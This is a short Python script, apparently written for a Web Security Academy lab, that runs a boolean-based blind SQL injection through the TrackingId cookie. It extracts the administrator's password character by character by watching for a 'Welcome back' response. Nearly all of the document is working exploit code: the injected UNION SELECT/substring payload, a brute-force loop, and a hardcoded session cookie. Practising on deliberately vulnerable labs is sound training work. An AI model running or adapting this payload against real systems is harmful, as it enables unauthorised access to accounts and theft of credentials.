import requests
import re
import string
import os

# splchars = list()

# for i in range(32,47):
#     splchars.append(chr(i))

#charactors = string.ascii_letters + string.digits + "".join(splchars)
# print(charactors)
charactors = string.ascii_lowercase + string.digits 

seen_password = list()

offset = 1

while (True):
    for ch in charactors:
        url = 'https://ac321f5c1e9c53c88091580f0035003f.web-security-academy.net'
        cookies = dict(TrackingId="x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,"+ str(offset) +",1)=\'"+ ch +"\'--", session='ENAq3efReacEuy1Q5VVSj4veF9kRngaF')       
        r = requests.get(url,  cookies=cookies)
        content = r.text
        os.system('cls')
        print("trying with password :- ", "".join(seen_password) + ch)
        if ( len(seen_password) != 20):
            if ('Welcome back' in content):
                seen_password.append(ch)
                print("[+] Found password charectors till now - ",seen_password)
                offset = offset + 1
                break
        else:
            print("[+] Found Password ", "".join(seen_password))


